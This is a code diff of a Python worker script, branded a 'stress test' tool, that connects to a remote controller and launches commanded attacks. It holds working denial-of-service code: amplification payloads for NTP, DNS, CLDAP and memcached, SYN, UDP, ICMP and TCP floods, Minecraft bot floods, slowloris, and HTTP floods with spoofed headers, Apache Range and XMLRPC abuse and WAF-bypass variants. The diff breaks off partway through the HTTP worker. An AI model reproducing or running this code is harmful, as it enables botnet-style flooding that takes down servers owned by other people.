@@ -2,10 +2,11 @@
 """
 AegisShield Stress Test Worker v4.0 (ULTIMATE)
 =======================================================
-Optimized for 2Gbps+ links. Uses multiprocessing + threading for max throughput.
-Supports full range of L4 and L7 amplification payloads, WAF bypass, HTTP attacks.
+Connects to a controller and executes attack commands.
+Supports all 46 methods (L4 + L7) with multiprocessing + threading.
+
 Usage:
-    python3 worker.py --master 52.53.124.44:7777
+    python worker.py --master <CONTROLLER_IP>:7777
 """
 
 import socket
@@ -20,25 +21,109 @@ import http.client
 import sys
 import os
 import struct
+import urllib.parse
 
 # ══════════════════════════════════════════════════════════════════
-#  Specific Attack Protocol Payloads (Amplifications / Games)
+#  Protocol Payloads — synced with start.py
 # ══════════════════════════════════════════════════════════════════
 UDP_PAYLOADS = {
-    "vse": b'\xff\xff\xff\xffTSource Engine Query\x00',
-    "ts3": b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
-    "fivem": b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
-    "fivem-token": b'\xff\xff\xff\xffgetstatus\x00',
-    "mem": b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
-    "ntp": b'\x17\x00\x03\x2a' + b'\x00'*44,
-    "mcpe": b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
-    "dns": b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
-    "char": b'\x01',
-    "cldap": b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
-    "ard": b'\x00\x14\x00\x00\x00\x00\x00\x00',
-    "rdp": b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00'
+    "VSE":    b'\xff\xff\xff\xffTSource Engine Query\x00',
+    "TS3":    b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
+    "FIVEM":  b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
+    "FIVEM-TOKEN": b'\xff\xff\xff\xffgetstatus\x00',
+    "MEM":    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
+    "NTP":    b'\x17\x00\x03\x2a' + b'\x00' * 44,
+    "MCPE":   b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
+    "DNS":    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
+    "CHAR":   b'\x01',
+    "CLDAP":  b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+    "ARD":    b'\x00\x14\x00\x00\x00\x00\x00\x00',
+    "RDP":    b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',
 }
 
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+]
+
+LAYER4_METHODS = {
+    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
+    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
+    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
+    "MCBOT", "MINECRAFT",
+}
+
+LAYER7_METHODS = {
+    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
+    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
+    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
+    "NULL", "COOKIE",
+}
+
+
+# ══════════════════════════════════════════════════════════════════
+#  Helpers
+# ══════════════════════════════════════════════════════════════════
+
+def rand_ip():
+    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+
+def rand_str(length=12):
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    return ''.join(random.choice(chars) for _ in range(length))
+
+
+# ══════════════════════════════════════════════════════════════════
+#  Minecraft Protocol — synced with start.py
+# ══════════════════════════════════════════════════════════════════
+
+class MC:
+    @staticmethod
+    def varint(d):
+        o = b''
+        while True:
+            b = d & 0x7F
+            d >>= 7
+            o += struct.pack("B", b | (0x80 if d > 0 else 0))
+            if d == 0:
+                break
+        return o
+
+    @staticmethod
+    def data(*payload):
+        payload = b''.join(payload)
+        return MC.varint(len(payload)) + payload
+
+    @staticmethod
+    def handshake(host, port, protocol=47, state=1):
+        return MC.data(
+            MC.varint(0x00), MC.varint(protocol),
+            MC.data(host.encode()), struct.pack('>H', port), MC.varint(state)
+        )
+
+    @staticmethod
+    def login(username):
+        if isinstance(username, str):
+            username = username.encode()
+        return MC.data(MC.varint(0x00), MC.data(username))
+
+    @staticmethod
+    def chat(message):
+        return MC.data(MC.varint(0x01), MC.data(message.encode()))
+
+    @staticmethod
+    def ping():
+        return MC.data(b'\x00')
+
+
+# ══════════════════════════════════════════════════════════════════
+#  Worker class — connects to controller
+# ══════════════════════════════════════════════════════════════════
 
 class StressWorker:
     def __init__(self, master_host, master_port):
@@ -92,124 +177,134 @@ class StressWorker:
             self.stop_flag.set()
         elif cmd == "attack":
             self.stop_flag.clear()
-            power = msg.get("power", 100)
             threading.Thread(
-                target=self.run_attack,
-                args=(msg["target"], msg["port"], msg["method"],
-                      msg["size"], msg["duration"], power),
-                daemon=True,
+                target=self.run_attack, args=(msg,), daemon=True
             ).start()
 
-    def run_attack(self, target, port, method, size, duration, power):
-        # Scale processes down if power is low
+    def run_attack(self, msg):
+        method = msg["method"]
+        target = msg["target"]
+        port = msg.get("port", 0)
+        threads = msg.get("threads", 100)
+        duration = msg.get("duration", 60)
+        power = msg.get("power", 100)
+        layer = msg.get("layer", 4 if method in LAYER4_METHODS else 7)
+
+        print(f"  🔥 {method} → Layer {layer} | Power: {power}%")
+
+        if layer == 4:
+            self._run_l4_attack(target, port, method, threads, duration, power)
+        else:
+            self._run_l7_attack(target, method, threads, duration, power)
+
+    # ──── L4 ATTACK DISPATCHER ────────────────────────────────────
+
+    def _run_l4_attack(self, target, port, method, threads, duration, power):
         max_cpus = os.cpu_count() or 4
-        cpu_count = max(1, int(max_cpus * (power / 100.0)))
-        
-        delay = 0.0
-        if power < 100:
-            delay = (100 - power) / 10000.0
+        num_procs = max(1, int(max_cpus * (power / 100.0)))
+        threads_per_proc = max(1, threads // num_procs)
 
-        size_disp = "RANDOM" if size == -1 else f"{size}B"
-        if method in UDP_PAYLOADS:
-            size_disp = f"Fixed ({len(UDP_PAYLOADS[method])}B)"
-            
-        print(f"  🔥 {method.upper()} → {target}:{port} | {size_disp} | {duration}s | Pwr: {power}%")
-        print(f"     Procs: {cpu_count} (Max {max_cpus}) | Throttle delay: {delay:.5f}s")
+        print(f"     Target: {target}:{port} | {duration}s | Procs: {num_procs} | Threads/proc: {threads_per_proc}")
 
-        udp_methods = ("udp", "ovh", "vse", "ts3", "fivem", "fivem-token", "mem", "ntp", "mcpe", "dns", "char", "cldap", "ard", "rdp")
-        tcp_methods = ("tcp", "syn", "cps", "connection", "mcbot", "minecraft")
-
-        if method in udp_methods:
-            self._attack_udp_mp(target, port, method, size, duration, cpu_count, delay)
-        elif method in tcp_methods:
-            self._attack_tcp_mp(target, port, method, size, duration, cpu_count, delay)
-        elif method == "icmp":
-            self._attack_icmp(target, port, duration, cpu_count, delay)
-        elif method == "http":
-            self._attack_http(target, port, duration, use_ssl=False, power=power)
-        elif method == "https":
-            self._attack_http(target, port, duration, use_ssl=True, power=power)
-        elif method == "slow":
-            self._attack_slowloris(target, port, duration, power)
-
-    # ──────────────────────────────────────────────────────────────
-    #  UDP FLOOD — Multiprocess + Multithread for max bandwidth
-    # ──────────────────────────────────────────────────────────────
-    def _attack_udp_mp(self, target, port, method, size, duration, num_procs, delay):
         counter = multiprocessing.Value('q', 0)
         stop = multiprocessing.Event()
         procs = []
 
+        udp_methods = {"UDP", "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
+                        "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"}
+        tcp_methods = {"TCP", "SYN", "CPS", "CONNECTION", "MCBOT", "MINECRAFT"}
+
         for _ in range(num_procs):
-            p = multiprocessing.Process(
-                target=_udp_process,
-                args=(target, port, method, size, duration, counter, stop, delay),
-                daemon=True
-            )
+            if method in udp_methods:
+                p = multiprocessing.Process(
+                    target=_udp_process,
+                    args=(target, port, method, duration, counter, stop, threads_per_proc), daemon=True)
+            elif method == "ICMP":
+                p = multiprocessing.Process(
+                    target=_icmp_process,
+                    args=(target, duration, counter, stop, threads_per_proc), daemon=True)
+            elif method in tcp_methods:
+                p = multiprocessing.Process(
+                    target=_tcp_process,
+                    args=(target, port, method, duration, counter, stop, threads_per_proc), daemon=True)
+            else:
+                continue
             p.start()
             procs.append(p)
 
-        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
-                               method=method.upper(), size=size, procs=procs, stop=stop)
+        self._monitor(time.time(), duration, counter, method, procs, stop)
 
-    # ──────────────────────────────────────────────────────────────
-    #  TCP FLOOD — Multiprocess connection storm
-    # ──────────────────────────────────────────────────────────────
-    def _attack_tcp_mp(self, target, port, method, size, duration, num_procs, delay):
+    # ──── L7 ATTACK DISPATCHER ────────────────────────────────────
+
+    def _run_l7_attack(self, url_str, method, threads, duration, power):
+        if not url_str.startswith("http"):
+            url_str = "http://" + url_str
+
+        url_obj = urllib.parse.urlparse(url_str)
+        use_ssl = url_obj.scheme == "https"
+        thread_count = max(1, int(threads * (power / 100.0)))
+
+        print(f"     Target: {url_str} | {method} | {duration}s | Threads: {thread_count}")
+
         counter = multiprocessing.Value('q', 0)
-        stop = multiprocessing.Event()
-        procs = []
+        stop = threading.Event()
 
-        for _ in range(num_procs):
-            p = multiprocessing.Process(
-                target=_tcp_process,
-                args=(target, port, method, size, duration, counter, stop, delay),
-                daemon=True
-            )
-            p.start()
-            procs.append(p)
+        thread_list = []
+        for _ in range(thread_count):
+            t = threading.Thread(
+                target=_l7_http_worker,
+                args=(url_obj, method, duration, counter, stop, use_ssl), daemon=True)
+            t.start()
+            thread_list.append(t)
 
-        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
-                               method=method.upper(), size=size, procs=procs, stop=stop)
+        start_time = time.time()
+        try:
+            while time.time() - start_time < duration and not self.stop_flag.is_set():
+                time.sleep(2)
+                elapsed = max(time.time() - start_time, 0.1)
+                sent = counter.value
+                rps = sent / elapsed
+                self.send_msg({"type": "stats", "sent": sent,
+                               "pps": round(rps), "mbps": 0, "method": method})
+                print(f"  📊 {method} | {sent:,} reqs | {rps:,.0f} req/s")
+        except KeyboardInterrupt:
+            pass
 
-    # ──────────────────────────────────────────────────────────────
-    #  ICMP FLOOD — Raw sockets ping
-    # ──────────────────────────────────────────────────────────────
-    def _attack_icmp(self, target, port, duration, num_procs, delay):
-        counter = multiprocessing.Value('q', 0)
-        stop = multiprocessing.Event()
-        procs = []
+        stop.set()
+        if self.stop_flag.is_set():
+            stop.set()
+        for t in thread_list:
+            t.join(timeout=2)
 
-        for _ in range(num_procs):
-            p = multiprocessing.Process(
-                target=_icmp_process,
-                args=(target, duration, counter, stop, delay),
-                daemon=True
-            )
-            p.start()
-            procs.append(p)
+        total = counter.value
+        elapsed = max(time.time() - start_time, 0.1)
+        self.send_msg({"type": "done", "total": total, "duration": round(elapsed, 1)})
+        print(f"  ✅ {method} done. {total:,} requests in {elapsed:.1f}s")
 
-        self._monitor_progress(start_time=time.time(), duration=duration, counter=counter, 
-                               method="ICMP", size=64, procs=procs, stop=stop)
+    # ──── MONITORING ──────────────────────────────────────────────
 
-    def _monitor_progress(self, start_time, duration, counter, method, size, procs, stop):
+    def _monitor(self, start_time, duration, counter, method, procs, stop):
         try:
             while time.time() - start_time < duration and not self.stop_flag.is_set():
                 time.sleep(2)
                 elapsed = max(time.time() - start_time, 0.1)
                 sent = counter.value
                 pps = sent / elapsed
-                avg_size = 32768 if size == -1 else max(size, 1)
-                
-                # Assume 64 byte avg for empty payloads like SYN
-                if size == 0: avg_size = 64
-                if method.lower() in UDP_PAYLOADS: 
-                    avg_size = len(UDP_PAYLOADS[method.lower()])
-                    
+
+                if method in UDP_PAYLOADS:
+                    avg_size = len(UDP_PAYLOADS[method])
+                elif method == "OVH-UDP":
+                    avg_size = 600
+                elif method in {"SYN", "CPS", "ICMP"}:
+                    avg_size = 64
+                elif method in {"CONNECTION", "MCBOT", "MINECRAFT"}:
+                    avg_size = 128
+                else:
+                    avg_size = 2048
+
                 mbps = sent * avg_size * 8 / elapsed / 1_000_000
                 self.send_msg({"type": "stats", "sent": sent,
-                               "pps": round(pps), "mbps": round(mbps, 1),
-                               "method": method})
+                               "pps": round(pps), "mbps": round(mbps, 1), "method": method})
                 print(f"  📊 {method} | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
         except KeyboardInterrupt:
             pass
@@ -222,182 +317,50 @@ class StressWorker:
 
         total = counter.value
         elapsed = max(time.time() - start_time, 0.1)
-        self.send_msg({"type": "done", "total": total, "duration": elapsed})
+        self.send_msg({"type": "done", "total": total, "duration": round(elapsed, 1)})
         print(f"  ✅ {method} done. {total:,} pkts in {elapsed:.1f}s")
 
-    # ──────────────────────────────────────────────────────────────
-    #  HTTP/HTTPS FLOOD
-    # ──────────────────────────────────────────────────────────────
-    def _attack_http(self, target, port, duration, use_ssl=False, power=100):
-        sent = [0]
-        end_time = time.time() + duration
-        threads = max(1, int(64 * (power / 100.0)))
-        proto = "HTTPS" if use_ssl else "HTTP"
-        delay = (100 - power) / 1000.0
-
-        def worker():
-            while time.time() < end_time and not self.stop_flag.is_set():
-                try:
-                    if use_ssl:
-                        ctx = ssl.create_default_context()
-                        ctx.check_hostname = False
-                        ctx.verify_mode = ssl.CERT_NONE
-                        conn = http.client.HTTPSConnection(target, port, timeout=5, context=ctx)
-                    else:
-                        conn = http.client.HTTPConnection(target, port, timeout=5)
-                    conn.request("GET", "/", headers={
-                        "User-Agent": f"Mozilla/5.0 (Windows NT {random.randint(6, 11)}.0; Win64; x64) AppleWebKit/537.36",
-                        "Accept": "*/*", "Connection": "close",
-                    })
-                    conn.getresponse()
-                    sent[0] += 1
-                    conn.close()
-                except Exception:
-                    sent[0] += 1
-                if delay > 0:
-                    time.sleep(delay)
-
-        thread_list = []
-        for _ in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_list.append(t)
-
-        start = time.time()
-        while time.time() < end_time and not self.stop_flag.is_set():
-            time.sleep(2)
-            elapsed = max(time.time() - start, 0.1)
-            rps = sent[0] / elapsed
-            self.send_msg({"type": "stats", "sent": sent[0],
-                           "pps": round(rps), "mbps": 0, "method": proto})
-            print(f"  📊 {proto} | {sent[0]:,} reqs | {rps:,.0f} req/s")
-
-        for t in thread_list:
-            t.join(timeout=2)
-
-        elapsed = max(time.time() - start, 0.1)
-        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
-        print(f"  ✅ {proto} done. {sent[0]:,} reqs in {elapsed:.1f}s")
-
-    # ──────────────────────────────────────────────────────────────
-    #  SLOWLORIS
-    # ──────────────────────────────────────────────────────────────
-    def _attack_slowloris(self, target, port, duration, power):
-        end_time = time.time() + duration
-        socket_count = max(10, int(300 * (power / 100.0)))
-        sent = [0]
-        sockets = []
-
-        def setup_socket():
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                if port == 443:
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    s = ctx.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
-                s.send(f"Host: {target}\r\n".encode("utf-8"))
-                s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
-                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-                return s
-            except OSError:
-                return None
-
-        for _ in range(socket_count):
-            if self.stop_flag.is_set():
-                break
-            sock = setup_socket()
-            if sock:
-                sockets.append(sock)
-                sent[0] += 1
-
-        start = time.time()
-        while time.time() < end_time and not self.stop_flag.is_set():
-            time.sleep(10)
-            
-            dead = []
-            for i, s in enumerate(sockets):
-                try:
-                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
-                except OSError:
-                    dead.append(i)
-            
-            for i in reversed(dead):
-                sockets.pop(i)
-                
-            for _ in range(socket_count - len(sockets)):
-                if self.stop_flag.is_set():
-                    break
-                sock = setup_socket()
-                if sock:
-                    sockets.append(sock)
-                    sent[0] += 1
-
-            active = len(sockets)
-            elapsed = max(time.time() - start, 0.1)
-            self.send_msg({"type": "stats", "sent": sent[0],
-                           "pps": active, "mbps": 0, "method": "SLOW"})
-            print(f"  📊 SLOWLORIS | {active} active conns | {sent[0]} total created")
-
-        for s in sockets:
-            try:
-                s.send("Connection: close\r\n\r\n".encode("utf-8"))
-                s.close()
-            except OSError: pass
-                
-        elapsed = max(time.time() - start, 0.1)
-        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
-        print(f"  ✅ SLOWLORIS done. {sent[0]} total conns created")
-
 
 # ══════════════════════════════════════════════════════════════════
-#  Standalone process functions (run in separate processes)
+#  Process-level workers (run in separate processes)
 # ══════════════════════════════════════════════════════════════════
 
-def _udp_process(target, port, method, size_val, duration, counter, stop_event, delay):
+def _udp_process(target, port, method, duration, counter, stop_event, thread_count=16):
     end_time = time.time() + duration
     BATCH = 50
 
     def sender():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
-        except Exception: pass
-        
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+        except Exception:
+            pass
+
+        static_payload = UDP_PAYLOADS.get(method)
         c = 0
-        static_payload = None
-        if method in UDP_PAYLOADS:
-            static_payload = UDP_PAYLOADS[method]
-        elif size_val > 0 and method != "ovh":
-            static_payload = random.randbytes(size_val)
-            
         while time.time() < end_time and not stop_event.is_set():
             try:
                 if static_payload:
                     payload = static_payload
-                elif method == "ovh":
-                    payload = b"GET / HTTP/1.1\r\nHost: " + random.randbytes(10) + b"\r\n\r\n" + random.randbytes(64)
+                elif method == "OVH-UDP":
+                    payload = (random.choice([b"GET", b"POST", b"HEAD"]) +
+                               b" / HTTP/1.1\r\nHost: " + rand_str(8).encode() +
+                               b"\r\n\r\n" + random.randbytes(random.randint(64, 1024)))
                 else:
-                    payload = random.randbytes(random.randint(64, 65507))
-                
+                    payload = random.randbytes(random.randint(512, 65507))
                 s.sendto(payload, (target, port))
                 c += 1
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
-                if delay > 0:
-                    time.sleep(delay)
             except OSError:
                 pass
-                
         with counter.get_lock():
             counter.value += c % BATCH
         s.close()
 
     threads = []
-    for _ in range(16):
+    for _ in range(thread_count):
         t = threading.Thread(target=sender, daemon=True)
         t.start()
         threads.append(t)
@@ -405,71 +368,76 @@ def _udp_process(target, port, method, size_val, duration, counter, stop_event, 
         t.join()
 
 
-def _tcp_process(target, port, method, size_val, duration, counter, stop_event, delay):
+def _tcp_process(target, port, method, duration, counter, stop_event, thread_count=16):
     end_time = time.time() + duration
-    BATCH = 10
+    BATCH = 5
 
     def connector():
         c = 0
-        static_payload = None
-        if size_val > 0 and method not in ("syn", "cps", "connection"):
-            if method in ("mcbot", "minecraft"):
-                static_payload = b"\x0f\x00\x2f\x09localhost\xdd\x01\x01\x00"
-            else:
-                static_payload = random.randbytes(size_val)
-            
         while time.time() < end_time and not stop_event.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                
-                if method == "syn":
-                    # pure python SYN flood trick: fire connect() non-blocking and close
+                if method == "SYN":
                     s.setblocking(False)
                     try:
                         s.connect((target, port))
-                    except (BlockingIOError, InterruptedError):
+                    except (BlockingIOError, InterruptedError, OSError):
                         pass
                     s.close()
                     c += 1
-                else:
+                elif method == "CPS":
                     s.settimeout(2)
                     s.connect((target, port))
-                    
-                    if method == "cps":
-                        s.close() # just rapid opens and closes
-                    elif method == "connection":
-                        s.sendall(b"X")
-                        time.sleep(0.5) # holding it slightly open
-                        s.close()
-                    else:
-                        if static_payload:
-                            payload = static_payload
-                        elif size_val == -1:
-                            payload = random.randbytes(random.randint(64, 32768))
-                        else:
-                            payload = b""
-                            
-                        if payload:
-                            s.sendall(payload)
-                        s.close()
+                    s.close()
                     c += 1
-                
+                elif method == "CONNECTION":
+                    s.settimeout(5)
+                    s.connect((target, port))
+                    s.sendall(b"X")
+                    time.sleep(random.uniform(0.3, 1.0))
+                    s.close()
+                    c += 1
+                elif method == "MCBOT":
+                    s.settimeout(3)
+                    s.connect((target, port))
+                    username = f"Bot_{rand_str(5)}"
+                    s.sendall(MC.handshake(target, port, 47, 2))
+                    s.sendall(MC.login(username))
+                    time.sleep(1)
+                    s.sendall(MC.chat(f"/register {rand_str(6)} {rand_str(6)}"))
+                    for _ in range(5):
+                        if stop_event.is_set(): break
+                        s.sendall(MC.chat(rand_str(128)))
+                        time.sleep(0.5)
+                    s.close()
+                    c += 1
+                elif method == "MINECRAFT":
+                    s.settimeout(3)
+                    s.connect((target, port))
+                    s.sendall(MC.handshake(target, port, 47, 1))
+                    s.sendall(MC.ping())
+                    s.close()
+                    c += 1
+                else:  # TCP
+                    s.settimeout(2)
+                    s.connect((target, port))
+                    s.sendall(random.randbytes(random.randint(256, 4096)))
+                    s.close()
+                    c += 1
+
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
-                if delay > 0:
-                    time.sleep(delay)
             except OSError:
                 c += 1
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
-                        
         with counter.get_lock():
             counter.value += c % BATCH
 
     threads = []
-    for _ in range(16):
+    for _ in range(thread_count):
         t = threading.Thread(target=connector, daemon=True)
         t.start()
         threads.append(t)
@@ -477,40 +445,31 @@ def _tcp_process(target, port, method, size_val, duration, counter, stop_event, 
         t.join()
 
 
-def _icmp_process(target, duration, counter, stop_event, delay):
+def _icmp_process(target, duration, counter, stop_event, thread_count=4):
     end_time = time.time() + duration
     BATCH = 10
-    
-    # Try opening raw socket (Requires Root/Admin)
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     except OSError as e:
-        print(f"  [!] ICMP failed (requires root/admin rights): {e}")
+        print(f"  [!] ICMP requires root/admin: {e}")
         return
 
-    def checksum(source_string):
+    def checksum(data):
         s_sum = 0
-        countTo = (len(source_string) // 2) * 2
-        count = 0
-        while count < countTo:
-            thisVal = source_string[count + 1] * 256 + source_string[count]
-            s_sum = s_sum + thisVal
-            s_sum = s_sum & 0xffffffff 
-            count = count + 2
-        if countTo < len(source_string):
-            s_sum = s_sum + source_string[-1]
-            s_sum = s_sum & 0xffffffff 
-        s_sum = (s_sum >> 16) + (s_sum & 0xffff)
-        s_sum = s_sum + (s_sum >> 16)
-        answer = ~s_sum
-        answer = answer & 0xffff
-        answer = answer >> 8 | (answer << 8 & 0xff00)
-        return answer
+        n = len(data) % 2
+        for i in range(0, len(data) - n, 2):
+            s_sum += data[i] + (data[i + 1] << 8)
+        if n:
+            s_sum += data[-1]
+        while (s_sum >> 16):
+            s_sum = (s_sum & 0xFFFF) + (s_sum >> 16)
+        return ~s_sum & 0xFFFF
 
     header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
-    data = b'Aegis ICMP Stress Test Packet ' * 2
-    my_checksum = checksum(header + data)
-    header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), 1, 1)
+    data = b'AegisShield ICMP Stress ' * 2
+    chk = checksum(header + data)
+    header = struct.pack('bbHHh', 8, 0, socket.htons(chk), 1, 1)
     packet = header + data
 
     def pinger():
@@ -522,15 +481,13 @@ def _icmp_process(target, duration, counter, stop_event, delay):
                 if c % BATCH == 0:
                     with counter.get_lock():
                         counter.value += BATCH
-                if delay > 0:
-                    time.sleep(delay)
             except OSError:
                 pass
         with counter.get_lock():
             counter.value += c % BATCH
 
     threads = []
-    for _ in range(4): # 4 threads per process for ICMP
+    for _ in range(thread_count):
         t = threading.Thread(target=pinger, daemon=True)
         t.start()
         threads.append(t)
@@ -538,21 +495,172 @@ def _icmp_process(target, duration, counter, stop_event, delay):
         t.join()
 
 
-BANNER = r"""
-   __        __         _               ____  
-   \ \      / /__  _ __| | _____ _ __  |___ \ 
-    \ \ /\ / / _ \| '__| |/ / _ \ '__|   __) |
-      V  V / (_) | |  |   <  __/ |     / __/ 
-      \_/\_/ \___/|_|  |_|\_\___|_|    |_____|
+# ══════════════════════════════════════════════════════════════════
+#  L7 HTTP Worker — synced with start.py methods
+# ══════════════════════════════════════════════════════════════════
 
-  AegisShield Stress Test Worker v4.0 (ULTIMATE)
+def _l7_http_worker(url_obj, method, duration, counter, stop_event, use_ssl=False):
+    end_time = time.time() + duration
+    host = url_obj.hostname
+    port = url_obj.port or (443 if use_ssl else 80)
+    path = url_obj.path or "/"
+
+    while time.time() < end_time and not stop_event.is_set():
+        try:
+            if use_ssl:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                conn = http.client.HTTPSConnection(host, port, timeout=5, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(host, port, timeout=5)
+
+            ua = random.choice(USER_AGENTS)
+            headers = {
+                "User-Agent": ua,
+                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Cache-Control": "max-age=0",
+                "X-Forwarded-For": rand_ip(),
+                "X-Real-IP": rand_ip(),
+            }
+
+            if method == "POST":
+                body = '{"data": "%s"}' % rand_str(random.randint(32, 256))
+                headers["Content-Type"] = "application/json"
+                conn.request("POST", path, body=body, headers=headers)
+            elif method == "HEAD":
+                conn.request("HEAD", path, headers=headers)
+            elif method == "PPS":
+                conn.request("GET", path, headers={"User-Agent": ua, "Host": host})
+            elif method == "STRESS":
+                body = '{"data": "%s"}' % rand_str(512)
+                headers["Content-Type"] = "application/json"
+                conn.request("POST", path, body=body, headers=headers)
+            elif method == "SLOW":
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                if use_ssl:
+                    ctx2 = ssl.create_default_context()
+                    ctx2.check_hostname = False
+                    ctx2.verify_mode = ssl.CERT_NONE
+                    s = ctx2.wrap_socket(s, server_hostname=host)
+                s.connect((host, port))
+                s.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n".encode())
+                while time.time() < end_time and not stop_event.is_set():
+                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                    with counter.get_lock():
+                        counter.value += 1
+                    time.sleep(random.uniform(5, 15))
+                s.close()
+                continue
+            elif method == "XMLRPC":
+                body = ("<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName>"
+                        "<params><param><value><string>%s</string></value></param>"
+                        "<param><value><string>%s</string></value></param></params></methodCall>" %
+                        (rand_str(64), rand_str(64)))
+                headers["Content-Type"] = "application/xml"
+                conn.request("POST", "/xmlrpc.php", body=body, headers=headers)
+            elif method == "BYPASS":
+                conn.request("GET", path, headers=headers)
+            elif method == "CFB":
+                headers["Sec-Fetch-Dest"] = "document"
+                headers["Sec-Fetch-Mode"] = "navigate"
+                headers["Upgrade-Insecure-Requests"] = "1"
+                conn.request("GET", path, headers=headers)
+            elif method == "DYN":
+                headers["Host"] = f"{rand_str(6)}.{host}"
+                conn.request("GET", path, headers=headers)
+            elif method == "NULL":
+                headers["User-Agent"] = "null"
+                conn.request("GET", path, headers=headers)
+            elif method == "APACHE":
+                range_hdr = ",".join(f"5-{i}" for i in range(1, 1024))
+                headers["Range"] = f"bytes=0-,{range_hdr}"
+                conn.request("GET", path, headers=headers)
+            elif method == "BOT":
+                headers["User-Agent"] = random.choice(USER_AGENTS[-2:])
